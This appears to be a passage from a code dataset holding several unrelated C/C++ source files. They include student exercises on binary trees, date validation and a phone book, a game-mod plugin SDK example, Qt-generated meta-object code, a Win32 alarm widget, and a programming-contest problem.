}\n                else\n                {\n                    break;\n                }\n            }\n        }\n        if (count != (n - 1))\n        {\n            check = 2;\n            fclose(file);\n            return;\n        }\n        count = 0;\n    }\n    if (s != n * n)\n    {\n        check = 2;\n        fclose(file);\n        return;\n    }\n    check = 1;\n    fclose;\n}\n\nvoid input_file(char a[], float A[][100], int &n)\n{   \n    setcolor(0,3);\n    int check;\n    do\n    {\n        printf(\"Nhap ten file du lieu: \");\n         setcolor(0, 8);\n        fgets(a, 100, stdin); // input name file to array a\n        a[strcspn(a, \"\\n\")] = 0;\n        setcolor(0,3);\n        read_file(a, n, A, check);\n        if (check == 0)\n        {\n            printf(\"File %s khong ton tai\\n\", a);\n        }\n        else if (check == 2)\n        {\n            printf(\"File %s bi loi \\n\", a);\n        }\n        else\n        {\n            printf(\"Doc file thanh cong\\n\");\n        }\n    } while (check == 0 || check == 2);\n}\n\nvoid change(float A[][100], float B[], int n)\n{ // data analysis\n    B[0] = 0;\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            B[i] += A[j][i];\n        }\n    }\n    float max = B[",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\nclass Node\r\n{\r\npublic:\r\n    int data;\r\n    Node *left;\r\n    Node *right;\r\n\r\n    Node(int data)\r\n    {\r\n        this->data = data;\r\n        this->left = NULL;\r\n        this->right = NULL;\r\n    }\r\n};\r\nclass NodeData\r\n{\r\npublic:\r\n    int size;\r\n    int minval;\r\n    int maxval;\r\n    bool validBST;\r\n     NodeData()\r\n    {\r\n    }\r\n\r\n    NodeData(int size, int max, int min, bool valid)\r\n    {\r\n        this->size = size;\r\n        minval = min;\r\n        maxval = max;\r\n        validBST = valid;\r\n    }\r\n};\r\n\r\nNodeData findLargestBST(Node *root, int &ans)\r\n{\r\n    // base case\r\n    if (root == NULL)\r\n    {\r\n        NodeData temp(0, INT_MIN, INT_MAX, true);\r\n        return temp;\r\n    }\r\n    // First find left subtree answer\r\n    NodeData leftAns = findLargestBST(root->left, ans);\r\n    \r\n    // Then find right subtree answer\r\n    NodeData rightAns = findLargestBST(root->right, ans);\r\n\r\n    /// Checking starts here\r\n    NodeData currNodeAns;\r\n\r\n    currNodeAns.size = leftAns.size + rightAns.size + 1;\r\n\r\n    currNodeAns.maxval = max(root->data, rightAns.maxval);\r\n    currNodeAns.minval = min(root->data, leftAns.minval);\r\n\r\n    // check bst hai ki nahi\r\n    if (leftAns.validBST && rightAns.validBST && (root->data > leftAns.maxval && root->data < rightAns.minval))\r\n    {\r\n        currNodeAns.validBST = true;\r\n    }\r\n    else\r\n    {\r\n        currNodeAns.validBST = false;\r\n    }\r\n    if (currNodeAns.validBST)\r\n    {\r\n        ans = max(ans, currNodeAns.size);\r\n    }\r\n    return currNodeAns;\r\n}\r\n\r\nint main()\r\n{\r\n    Node *root = new Node(50);\r\n    Node *first = new Node(30);\r\n    Node *second = new Node(60);\r\n    Node *third = new Node(5);\r\n    Node *fourth = new Node(20);\r\n    Node *fifth = new Node(30);\r\n    Node *sixth = new Node(60);\r\n    Node *seventh = new Node(5);\r\n    Node *eight = new Node(20);\r\n    \r\n    root->left = first;\r\n    root->right = second;\r\n    first->left = third;\r\n    first->right = fourth;\r\n    second ->left = fifth;\r\n    second ->right = sixth;\r\n    sixth ->left = seventh;\r\n    sixth -> right = eight;\r\n\r\n\r\n    cout << \"Printing the tree\" << endl;\r\n    // levelOrderTraversal(root);\r\n    int ans = 0;\r\n    findLargestBST(root, ans);\r\n    cout << \"Largest BST ka size \" << ans << endl;\r\n    return 0;\r\n}",
    "#include \"std_include.hpp\"\n\n#include <plutonium_sdk.hpp>\n\nplutonium::sdk::iinterface* plutonium_ = nullptr;\nusing namespace plutonium::sdk::interfaces;\nusing namespace plutonium::sdk::types;\n\nvoid gsc_method_test([[maybe_unused]] entref entity)\n{\n    plutonium_->logging()->info(\"GSC Method Test\");\n}\n\nvoid gsc_function_test()\n{\n    plutonium_->logging()->info(\"GSC Function Test\");\n}\n\nvoid client_command_function_test([[maybe_unused]] int client_num)\n{\n    plutonium_->logging()->info(\"Client Command Function Test\");\n}\n\nvoid main_scheduler_test()\n{\n    plutonium_->logging()->info(\"Main Frame Test!\");\n}\n\nscheduler::evaluation game_scheduler_test()\n{\n    plutonium_->logging()->info(\"Game Frame Test!\");\n    return scheduler::reschedule;\n}\n\nvoid on_dvar_init()\n{\n    plutonium_->logging()->info(\"Dvar System Initialized!\");\n}\n\nvoid on_after_dvar_init()\n{\n    plutonium_->logging()->info(\"Game Dvars Finished Initializing!\");\n}\n\nvoid on_game_init([[maybe_unused]] int level_time, [[maybe_unused]] int restart)\n{\n    plutonium_->logging()->info(\"Game Initialized!\");\n}\n\nvoid on_game_shutdown([[maybe_unused]] int freeing_scripts)\n{\n    plutonium_->logging()->info(\"Game Shutting Down!\");\n}\n\nvoid on_player_pre_connect([[maybe_unused]] unsigned int client_num)\n{\n    plutonium_->logging()->info(\"Player Connecting Once!\");\n}\n\nvoid on_player_connect([[maybe_unused]] unsigned int client_num)\n{\n    plutonium_->logging()->info(\"Player Connected!\");\n}\n\nvoid on_player_disconnect([[maybe_unused]] unsigned int client_num)\n{\n    plutonium_->logging()->info(\"Player Disconnected!\");\n}\n\nvoid on_script_load()\n{\n    plutonium_->logging()->info(\"Scripts are loading!\");\n}\n\nvoid on_script_execute()\n{\n    plutonium_->logging()->info(\"Scripts are executing!\");\n}\n\nstd::unique_ptr<plutonium::sdk::plugin> plugin_;\n\nclass plugin_impl final : public plutonium::sdk::plugin\n{\npublic:\n    const char* plugin_name() override\n    {\n        return \"Plutonium SDK Example\";\n    }\n\n    bool is_game_supported(const plutonium::sdk::game game) override\n    {\n        return game == plutonium::sdk::game::iw5;\n    }\n\n    void on_startup(plutonium::sdk::iinterface* interface_ptr, [[maybe_unused]] plutonium::sdk::game game) override\n    {\n        plutonium_ = interface_ptr;\n\n        // Logging to the Plutonium console\n        plutonium_->logging()->info(\"Plugin Startup Called\\n\");\n\n        // Register a built-in GSC function\n        plutonium_->gsc()->register_function(\"testPluginFunction\", gsc_function_test);\n\n        // Register a client command\n        plutonium_->client_command()->register_client_command(\"testClientCommand\", client_command_function_test);\n\n        // Register a built-in GSC method\n        plutonium_->gsc()->register_method(\"testPluginMethod\", gsc_method_test);\n\n        // Schedule a function to be called once on the main thread\n        plutonium_->scheduler()->once(main_scheduler_test);\n\n        // Schedule a function to be called on the game thread ever 1 second\n        plutonium_->scheduler()->every(game_scheduler_test, 1000, scheduler::thread::game);\n\n        // Add a callback when the dvar system is ready to register dvars\n        plutonium_->callbacks()->on_dvar_init(on_dvar_init);\n\n        // Add a callback when the dvar system is finished registering game dvars\n        plutonium_->callbacks()->on_after_dvar_init(on_after_dvar_init);\n\n        // Add a callback when the game server initialized\n        plutonium_->callbacks()->on_game_init(on_game_init);\n\n        // Add a callback when the game server shuts down\n        plutonium_->callbacks()->on_game_shutdown(on_game_shutdown);\n\n        // Add a callback when a player connects once\n        plutonium_->callbacks()->on_player_pre_connect(on_player_pre_connect);\n\n        // Add a callback when a player connects (including fast restarts)\n        plutonium_->callbacks()->on_player_connect(on_player_connect);\n\n        // Add a callback when a player disconnects\n        plutonium_->callbacks()->on_player_disconnect(on_player_disconnect);\n\n        // Add a callback when scripts are being loaded\n        plutonium_->callbacks()->on_scripts_load(on_script_load);\n\n        // Add a callback when scripts are being executed\n        plutonium_->callbacks()->on_scripts_execute(on_script_execute);\n    }\n\n    void on_shutdown() override\n    {\n    }\n};\n\nPLUTONIUM_API plutonium::sdk::plugin* on_initialize()\n{\n    return (plugin_ = std::make_unique<plugin_impl>()).get();\n}\n\nBOOL APIENTRY DllMain(HMODULE, DWORD, LPVOID)\n{\n    return TRUE;\n}\n",
    "/****************************************************************************\n** Meta object code from reading C++ file 'taothuvien.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.2.4)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include <memory>\n#include \"../../../../IC Tester/IC_Tester/include/taothuvien.h\"\n#include <QtGui/qtextcursor.h>\n#include <QScreen>\n#include <QtCore/qbytearray.h>\n#include <QtCore/qmetatype.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'taothuvien.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.2.4. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\nQT_BEGIN_MOC_NAMESPACE\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nstruct qt_meta_stringdata_MyButton_t {\n    const uint offsetsAndSize[8];\n    char stringdata0[23];\n};\n#define QT_MOC_LITERAL(ofs, len) \\\n    uint(offsetof(qt_meta_stringdata_MyButton_t, stringdata0) + ofs), len \nstatic const qt_meta_stringdata_MyButton_t qt_meta_stringdata_MyButton = {\n    {\nQT_MOC_LITERAL(0, 8), // \"MyButton\"\nQT_MOC_LITERAL(9, 7), // \"entered\"\nQT_MOC_LITERAL(17, 0), // \"\"\nQT_MOC_LITERAL(18, 4) // \"left\"\n\n    },\n    \"MyButton\\0entered\\0\\0left\"\n};\n#undef QT_MOC_LITERAL\n\nstatic const uint qt_meta_data_MyButton[] = {\n\n // content:\n      10,       // revision\n       0,       // classname\n       0,    0, // classinfo\n       2,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       2,       // signalCount\n\n // signals: name, argc, parameters, tag, flags, initial metatype offsets\n       1,    0,   26,    2, 0x06,    1 /* Public */,\n       3,    0,   27,    2, 0x06,    2 /* Public */,\n\n // signals: parameters\n    QMetaType::Void,\n    QMetaType::Void,\n\n       0        // eod\n};\n\nvoid MyButton::qt_static_metacall(QObject *_o, QMetaObject::Call _c, int _id, void **_a)\n{\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        auto *_t = static_cast<MyButton *>(_o);\n        (void)_t;\n        switch (_id) {\n        case 0: _t->entered(); break;\n        case 1: _t->left(); break;\n        default: ;\n        }\n    } else if (_c == QMetaObject::IndexOfMethod) {\n        int *result = reinterpret_cast<int *>(_a[0]);\n        {\n            using _t = void (MyButton::*)();\n            if (*reinterpret_cast<_t *>(_a[1]) == static_cast<_t>(&MyButton::entered)) {\n                *result = 0;\n                return;\n            }\n        }\n        {\n            using _t = void (MyButton::*)();\n            if (*reinterpret_cast<_t *>(_a[1]) == static_cast<_t>(&MyButton::left)) {\n                *result = 1;\n                return;\n            }\n        }\n    }\n    (void)_a;\n}\n\nconst QMetaObject MyButton::staticMetaObject = { {\n    QMetaObject::SuperData::link<QPushButton::staticMetaObject>(),\n    qt_meta_stringdata_MyButton.offsetsAndSize,\n    qt_meta_data_MyButton,\n    qt_static_metacall,\n    nullptr,\nqt_incomplete_metaTypeArray<qt_meta_stringdata_MyButton_t\n, QtPrivate::TypeAndForceComplete<MyButton, std::true_type>, QtPrivate::TypeAndForceComplete<void, std::false_type>, QtPrivate::TypeAndForceComplete<void, std::false_type>\n\n\n\n>,\n    nullptr\n} };\n\n\nconst QMetaObject *MyButton::metaObject() const\n{\n    return QObject::d_ptr->metaObject ? QObject::d_ptr->dynamicMetaObject() : &staticMetaObject;\n}\n\nvoid *MyButton::qt_metacast(const char *_clname)\n{\n    if (!_clname) return nullptr;\n    if (!strcmp(_clname, qt_meta_stringdata_MyButton.stringdata0))\n        return static_cast<void*>(this);\n    return QPushButton::qt_metacast(_clname);\n}\n\nint MyButton::qt_metacall(QMetaObject::Call _c, int _id, void **_a)\n{\n    _id = QPushButton::qt_metacall(_c, _id, _a);\n    if (_id < 0)\n        return _id;\n    if (_c == QMetaObject::InvokeMetaMethod) {\n        if (_id < 2)\n            qt_static_metacall(this, _c, _id, _a);\n        _id -= 2;\n    } else if (_c == QMetaObject::RegisterMethodArgumentMetaType) {\n        if (_id < 2)\n            *reinterpret_cast<QMetaType *>(_a[0]) = QMetaType();\n        _id -= 2;\n    }\n    return _id;\n}\n\n// SIGNAL 0\nvoid MyButton::entered()\n{\n    QMetaObject::activate(this, &staticMetaObject, 0, nullptr);\n}\n\n// SIGNAL 1\nvoid MyButton::left()\n{\n    QMetaObject::activate(this, &staticMetaObject, 1, nullptr);\n}\nstruct qt_meta_stringdata_TaoThuVien_t {\n    const uint offsetsAndSize[16];\n    char stringdata0[91];\n};\n#define QT_MOC_LITERAL(ofs, len) \\\n    uint(offsetof(qt_meta_stringdata_TaoThuVien_t, stringdata0) + ofs), len \nstatic const qt_meta_stringdata_TaoThuVien_t qt_meta_stringdata_TaoThuVien = {\n    {\nQT_MOC_LITERAL(0, 10), // \"TaoThuVien\"\nQT_MOC_LITERAL(11, 20), // \"opTrangCauHinhDuLieu\"\nQT_MOC_LITERAL(32, 0), // \"\"\nQT_MOC_LITERAL(33, 18), // \"opTrangCauHinhChan\"\nQT_MOC_LITERAL(52, 10), // \"opComplete\"\nQT_MOC_LI",
    "/* ************************************************************************** */\n/*                                                                            */\n/*                                                        :::      ::::::::   */\n/*   main.cpp                                           :+:      :+:    :+:   */\n/*                                                    +:+ +:+         +:+     */\n/*   By: sgarigli <sgarigli@student.42.fr>          +#+  +:+       +#+        */\n/*                                                +#+#+#+#+#+   +#+           */\n/*   Created: 2024/05/06 09:29:03 by sgarigli          #+#    #+#             */\n/*   Updated: 2024/05/09 10:56:30 by sgarigli         ###   ########.fr       */\n/*                                                                            */\n/* ************************************************************************** */\n\n#include \"PhoneBook.hpp\"\n\nint\tmain(void)\n{\n\tstd::string cmd;\n\tPhoneBook instance;\n\n\twhile(1)\n\t{\n\t\tstd::cout << \"Avaiable commands: ADD | SEARCH | EXIT\" << std::endl;\n\t\tif(!std::getline(std::cin, cmd))\n\t\t\tstd::exit(1);\n\t\tif (cmd == \"EXIT\")\n\t\t\tbreak;\n\t\telse if (cmd == \"ADD\")\n\t\t\tinstance.addContact();\n\t\telse if (cmd == \"SEARCH\")\n\t\t{\n\t\t\tif (instance.getnbrContacts() == 0)\n\t\t\t\tstd::cout << \"No contacts available\" << std::endl;\n\t\t\telse\n\t\t\t\tinstance.searchContact();\n\t\t}\n\t\telse\n\t\t\tstd::cout << \"Invalid command\" << std::endl;\n\t}\n\treturn (0);\n}",
    "#include <windows.h>\r\n#include <string>\r\n\r\n//#define IDI_MYICON 901\r\n#define ID_BUTTON_CLOSE 101\r\n#define ID_BUTTON_SETTINGS 102\r\n#define ID_BUTTON_ALERTE 103\r\n#define ID_EDIT_STOP 104\r\n#define ID_EDIT_HOUR 201\r\n#define ID_EDIT_MINUTE 202\r\n#define ID_EDIT_CHOIX 203\r\n#define ID_EDIT_HOURS 301\r\n#define ID_EDIT_MINUTES 302\r\n#define ID_EDIT_HOURS_MINUTES_SEND 303\r\n#define ID_EDIT_SAISIE 304\r\n// Convertit un nombre en cha\u00eene de caract\u00e8res wide string\r\nstd::wstring to_wstring(int number) {\r\n    return std::to_wstring(number);\r\n}\r\n\r\nSYSTEMTIME chosenTime; // Variable globale pour stocker l'heure choisie\r\nCOLORREF chosenColor; // Variable globale pour stocker la couleur choisie\r\n\r\nbool saisie_State = false;\r\nint Savebox_w, Savebox_h, Savebox_x, Savebox_y, New_w, New_h, New_x, New_y;\r\n// ici alerte AlerteActive(); permet de desactiver l'alerte et de vider les champs heure et minute\r\n// si l'alerte est activ\u00e9e alors il fautra appuyer sur le bouton point pour la desactiver.\r\n// si l'alerte est active alors la couleure de fond de passe par toutes les couleur de fa\u00e7on cyclique.\r\nbool isAlerteActive = false;\r\n\r\nHWND hwndMain;\r\n\r\nenum { COLOR_BLUE, COLOR_RED, COLOR_GREEN, COLOR_YELLOW, COLOR_PURPLE, COLOR_ORANGE };\r\nCOLORREF colors[] = { RGB(0, 0, 255), RGB(255, 0, 0), RGB(0, 255, 0), RGB(255, 255, 0), RGB(128, 0, 128), RGB(255, 165, 0) };\r\n\r\nDWORD WINAPI BackgroundThreadFunc(LPVOID lpParam);\r\nLRESULT CALLBACK WindowProcedure(HWND, UINT, WPARAM, LPARAM);\r\nvoid ShowSettingsDialog(HWND hwndParent);\r\nvoid InitializeGlobals();\r\nvoid SimulateTimeSelection();\r\nvoid SimulateColorSelection();\r\nvoid SetSaveNewvalue(HWND hwnd);\r\n//inventaire index\r\n//void  AlerteActive() {};\r\n//void ChangeBackgroundColor(HWND hwnd, COLORREF color) {}\r\n\r\nint WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\r\n    InitializeGlobals();\r\n\r\n    MSG messages;\r\n    WNDCLASS wc = { 0 };\r\n\r\n\r\n    wc.hInstance = hInstance;\r\n    wc.lpszClassName = L\"MainClass\";\r\n    wc.lpfnWndProc = WindowProcedure;\r\n    wc.style = CS_DBLCLKS;\r\n    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);\r\n    wc.hCursor = LoadCursor(NULL, IDC_ARROW);\r\n    wc.lpszMenuName = NULL;\r\n    wc.cbClsExtra = 0;\r\n    wc.cbWndExtra = 0;\r\n    wc.hbrBackground = (HBRUSH)COLOR_BACKGROUND;\r\n\r\n    if (!RegisterClass(&wc)) return 0;\r\n\r\n    hwndMain = CreateWindowExW(WS_EX_LAYERED | WS_EX_TOPMOST, L\"MainClass\", L\"FabAlarme\", WS_POPUP | WS_VISIBLE | WS_THICKFRAME, CW_USEDEFAULT, CW_USEDEFAULT, 85, 70, HWND_DESKTOP, NULL, hInstance, NULL);\r\n    SetLayeredWindowAttributes(hwndMain, 0, (255 * 75) / 100, LWA_ALPHA);\r\n\r\n    CreateWindow(L\"BUTTON\", L\"X\", WS_VISIBLE | WS_CHILD, 45, 10, 20, 20, hwndMain, (HMENU)ID_BUTTON_CLOSE, hInstance, NULL);\r\n    CreateWindow(L\"BUTTON\", L\"O\", WS_VISIBLE | WS_CHILD, 5, 10, 20, 20, hwndMain, (HMENU)ID_BUTTON_SETTINGS, hInstance, NULL);\r\n    CreateWindow(L\"BUTTON\", L\".\", WS_VISIBLE | WS_CHILD, 25, 20, 20, 20, hwndMain, (HMENU)ID_BUTTON_ALERTE, hInstance, NULL);\r\n    // Cr\u00e9ation des champs de saisie pour l'heure et les minutes\r\n    HWND hwndHourEdit = CreateWindow(L\"EDIT\", L\"23\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 15, 50, 40, 20, hwndMain, (HMENU)ID_EDIT_HOUR, NULL, NULL);\r\n    HWND hwndMinuteEdit = CreateWindow(L\"EDIT\", L\"59\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 70, 50, 40, 20, hwndMain, (HMENU)ID_EDIT_MINUTE, NULL, NULL);\r\n    HWND hwndsStopEdit = CreateWindow(L\"EDIT\", L\"<--- Stoper l'alarme!\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 140, 20, 140, 20, hwndMain, (HMENU)ID_EDIT_STOP, NULL, NULL);\r\n    HWND hwndsChoixEdit = CreateWindow(L\"EDIT\", L\"<--- Alarme choisie.\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 140, 50, 140, 20, hwndMain, (HMENU)ID_EDIT_CHOIX, NULL, NULL);\r\n    HWND hwndsSaisieEdit = CreateWindow(L\"EDIT\", L\"<--- Zone de saisie.\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 140, 90, 140, 20, hwndMain, (HMENU)ID_EDIT_SAISIE, NULL, NULL);\r\n    // Passer des champs en lecture seule\r\n    SendMessage(hwndHourEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    SendMessage(hwndMinuteEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    SendMessage(hwndsStopEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    SendMessage(hwndsChoixEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    SendMessage(hwndsSaisieEdit, EM_SETREADONLY, (WPARAM)TRUE, 0);\r\n    //Formulaire\r\n    CreateWindow(L\"EDIT\", L\"HH \", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 15, 90, 40, 20, hwndMain, (HMENU)ID_EDIT_HOURS, NULL, NULL);\r\n    CreateWindow(L\"EDIT\", L\"MM\", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_NUMBER, 70, 90, 40, 20, hwndMain, (HMENU)ID_EDIT_MINUTES, NULL, NULL);\r\n    CreateWindow(L\"BUTTON\", L\"Enregistrer!\", WS_VISIBLE | WS_CHILD, 15, 115, 95, 20, hwndMain, (HMENU)ID_EDIT_HOURS_MINUTES_SEND, hInstance, NULL);\r\n    ShowWindow(hwndMain, nCmdShow);\r\n\r\n    //\r\n  \r\n    HICON hIcon = LoadIcon(NULL, IDI_APPLICATION);\r\n    if (hIcon) {\r\n        SendMessage(hwndMain, WM_SETICON, ICON_BIG, (LPARAM)hIcon);\r\n        SendMessage(hwndMain, WM_SETICON, ICON_SMA",
    "/*\n Program Name: Exception_Handling.cpp\n Programmer: Moris Gomez\n Date: Tuesday 05/3/2024\n Version Control: 10.0\n About: Week 12, CSCI 2, HW.\n Description:\n Design a class called Date. The class should store a date in\n three integers: month, day, and year.\n There should be member functions to print the date in the following forms:\n\n 12/25/2015\n December 25, 2015\n 25 December 2015\n\n The class should implement the following exception classes:\n\n InvalidDay->Throw when an invalid day (< 1 or > 31) is passed to the class.\n InvalidMonth->Throw when an invalid month (< 1 or > 12) is passed to the class.\n */\n\n#include <iostream>\nusing namespace std;\n\nclass Date\n{\nprivate:\n    int month;\n    int day;\n    int year;\npublic:\n    //nested class for throwing object type to catch:\n    class InvalidDay\n    {\n        //empty class btw.\n    }; //end nested class InvalidDay.\n    \n    //nested class for throwing object type to catch:\n    class InvalidMonth\n    {\n        //empty class btw.\n    }; //end nested class InvalidMonth.\n    \n    //constructor:\n    Date(int m, int d, int y)\n    {\n        if(m < 1 || m > 12)\n        {\n            throw InvalidMonth();\n        }\n        else if(d < 1 || d > 31)\n        {\n            throw InvalidDay();\n        }\n        else\n        {\n            month = m;\n            day = d;\n            year = y;\n        }\n    }\n    \n    //function #1:\n    void print1()\n    {\n        cout << month << \"/\" << day << \"/\" << year << endl;\n    } //end function.\n    \n    //function #2:\n    void print2()\n    {\n        string mon;\n        if(month == 1)\n        {\n            mon = \"January\";\n        }\n        else if(month == 2)\n        {\n            mon = \"February\";\n        }\n        else if(month == 3)\n        {\n            mon = \"March\";\n        }\n        else if(month == 4)\n        {\n            mon = \"April\";\n        }\n        else if(month == 5)\n        {\n            mon = \"May\";\n        }\n        else if(month == 6)\n        {\n            mon = \"June\";\n        }\n        else if(month == 7)\n        {\n            mon = \"July\";\n        }\n        else if(month == 8)\n        {\n            mon = \"August\";\n        }\n        else if(month == 9)\n        {\n            mon = \"September\";\n        }\n        else if(month == 10)\n        {\n            mon = \"October\";\n        }\n        else if(month == 11)\n        {\n            mon = \"November\";\n        }\n        else if(month == 12)\n        {\n            mon = \"December\";\n        }\n       //December 25, 2015\n        cout << mon << \" \" << day << \", \" << year << endl;\n    } //end function.\n    \n    //function #3:\n    void print3()\n    {\n        string mon;\n        if(month == 1)\n        {\n            mon = \"January\";\n        }\n        else if(month == 2)\n        {\n            mon = \"February\";\n        }\n        else if(month == 3)\n        {\n            mon = \"March\";\n        }\n        else if(month == 4)\n        {\n            mon = \"April\";\n        }\n        else if(month == 5)\n        {\n            mon = \"May\";\n        }\n        else if(month == 6)\n        {\n            mon = \"June\";\n        }\n        else if(month == 7)\n        {\n            mon = \"July\";\n        }\n        else if(month == 8)\n        {\n            mon = \"August\";\n        }\n        else if(month == 9)\n        {\n            mon = \"September\";\n        }\n        else if(month == 10)\n        {\n            mon = \"October\";\n        }\n        else if(month == 11)\n        {\n            mon = \"November\";\n        }\n        else if(month == 12)\n        {\n            mon = \"December\";\n        }\n       //25 December 2015\n        cout << day << \" \" << mon << \" \" << year << endl;\n    } //end function.\n}; //end class Date.\n\n\nint main()\n{\n    try\n    {\n        //Date one(13, 2, 2024); //passed.\n        //Date one(13, 37, 2024); //passed.\n        //Date one(5, 3, 2024); //passed.\n        Date one(5, -2, 2024); //passed.\n        \n        one.print1();\n        one.print2();\n        one.print3();\n    } //end try.\n    \n    catch(Date::InvalidMonth) //type of throw & catch is object.\n    {\n        cout << \"[ERROR] <-- Months cannot be less than 1 or greater than 12 -->\" << endl;\n    } //end catch.\n    \n    catch(Date::InvalidDay) //type of throw & catch is object.\n    {\n        cout << \"[ERROR] <-- Days cannot be less than 1 or greater than 31 -->\" << endl;\n    } //end catch.\n\n    return 0;\n}\n",
    "/*\n411\u3001\u5185\u5b58\u51b7\u70ed\u6807\u8bb0\n\u9898\u76ee\u63cf\u8ff0\uff1a\n\u73b0\u4ee3\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\u901a\u5e38\u5b58\u5728\u591a\u7ea7\u7684\u5b58\u50a8\u8bbe\u5907\uff0c\u9488\u5bf9\u6d77\u91cfworkload\u7684\u4f18\u5316\u7684\u4e00\u79cd\u601d\u8def\u662f\u5c06\u70ed\u70b9\u5185\u5b58\u9875\u4f18\u5148\u653e\u5230\u5feb\u901f\u5b58\u50a8\u5c42\u7ea7\uff0c\u8fd9\u5c31\u9700\u8981\u5bf9\u5185\u5b58\u9875\u8fdb\u884c\u51b7\u70ed\u6807\u8bb0\u3002\n\u4e00\u79cd\u5178\u578b\u7684\u65b9\u6848\u662f\u57fa\u4e8e\u5185\u5b58\u9875\u7684\u8bbf\u95ee\u9891\u6b21\u8fdb\u884c\u6807\u8bb0\uff0c\u5982\u679c\u7edf\u8ba1\u7a97\u53e3\u5185\u8bbf\u95ee\u6b21\u6570\u5927\u4e8e\u7b49\u4e8e\u8bbe\u5b9a\u9608\u503c\uff0c\u5219\u8ba4\u4e3a\u662f\u70ed\u5185\u5b58\u9875\uff0c\u5426\u5219\u662f\u51b7\u5185\u5b58\u9875\u3002\n\u5bf9\u4e8e\u7edf\u8ba1\u7a97\u53e3\u5185\u8ddf\u8e2a\u5230\u7684\u8bbf\u5b58\u5e8f\u5217\u548c\u9608\u503c\uff0c\u73b0\u5728\u9700\u8981\u5b9e\u73b0\u57fa\u4e8e\u9891\u6b21\u7684\u51b7\u70ed\u6807\u8bb0\u3002\u5185\u5b58\u9875\u4f7f\u7528\u9875\u6846\u53f7\u4f5c\u4e3a\u6807\u8bc6\u3002\n\n\u8f93\u5165\u63cf\u8ff0\uff1a\n\u7b2c\u4e00\u884c\u4e3a\u8f93\u5165\u4e3aN\uff0c\u8868\u793a\u8bbf\u5b58\u5e8f\u5217\u7684\u8bb0\u5f55\u6761\u6570\uff0c0\uff1cN\u226410000\n\u7b2c\u4e8c\u884c\u4e3a\u8bbf\u5b58\u5e8f\u5217\uff0c\u7a7a\u683c\u95f4\u9694\u7684N\u4e2a\u5185\u5b58\u9875\u6846\u53f7\uff0c\u9875\u6846\u53f7\u8303\u56f40-65535\uff0c\u540c\u4e00\u9875\u6846\u53f7\u53ef\u80fd\u91cd\u590d\u51fa\u73b0\uff0c\u51fa\u73b0\u7684\u6b21\u6570\u5373\u4e3a\u5bf9\u5e94\u9875\u6846\u53f7\u7684\u9891\u6b21\u3002\u7b2c\u4e09\u884c\u4e3a\u70ed\u5185\u5b58\u9875\u7684\u9891\u6b21\u9608\u503cT\uff0c\u6b63\u6574\u6570\uff0c\u8303\u56f41\u2264T\u226410000\n\n\u8f93\u51fa\u63cf\u8ff0\uff1a\n\u7b2c\u4e00\u884c\u8f93\u51fa\u6807\u8bb0\u4e3a\u70ed\u5185\u5b58\u7684\u5185\u5b58\u9875\u4e2a\u6570\uff0c\u5982\u679c\u6ca1\u6709\u88ab\u6807\u8bb0\u4e3a\u70ed\u5185\u5b58\u7684\uff0c\u5219\u8f93\u51fa0\u3002\n\u5982\u679c\u7b2c\u4e00\u884c>0\uff0c\u5219\u63a5\u4e0b\u6765\u6309\u7167\u8bbf\u95ee\u9891\u6b21\u964d\u5e8f\u8f93\u51fa\u5185\u5b58\u9875\u6846\u53f7\uff0c\u4e00\u884c\u4e00\u4e2a\uff0c\u9891\u6b21\u4e00\u6837\u7684\u9875\u6846\u53f7\uff0c\u9875\u6846\u53f7\u5c0f\u7684\u6392\u524d\u9762\u3002\n\n\u8865\u5145\u8bf4\u660e\uff1a\n\u793a\u4f8b1\n\u8f93\u5165\uff1a\n10\n1 2 1 2 1 2 1 2 1 2\n5\n\u8f93\u51fa\uff1a\n2\n1\n2\n\u8bf4\u660e\uff1a\n\u5185\u5b58\u98751\u548c\u5185\u5b58\u98752\u5747\u88ab\u8bbf\u95ee\u4e865\u6b21\uff0c\u8fbe\u5230\u4e86\u9608\u503c5\uff0c\u56e0\u6b64\u70ed\u5185\u5b58\u9875\u67092\u4e2a\u3002\u5185\u5b58\u98751\u548c\u5185\u5b58\u98752\u7684\u8bbf\u95ee\u9891\u6b21\u76f8\u7b49\uff0c\u9875\u6846\u53f7\u5c0f\u7684\u6392\u524d\u9762\u3002\n\n\u793a\u4f8b2\n\u8f93\u5165\uff1a\n5\n1 2 3 4 5\n3\n\u8f93\u51fa\uff1a\n0\n\u8bf4\u660e\uff1a\n\u8bbf\u5b58\u8ddf\u8e2a\u91cc\u9762\u8bbf\u95ee\u9891\u6b21\u6ca1\u6709\u8d85\u8fc73\u7684\uff0c\u56e0\u6b64\u70ed\u5185\u5b58\u9875\u4e2a\u6570\u4e3a0\u3002\n*/\n\n#include<iostream>\n#include<vector>\n#include<set>\n#include<map>\n#include<algorithm>\n\nusing namespace std;\n\nbool cmp(pair<int, int> p1, pair<int, int> p2)\n{\n\tif (p1.second != 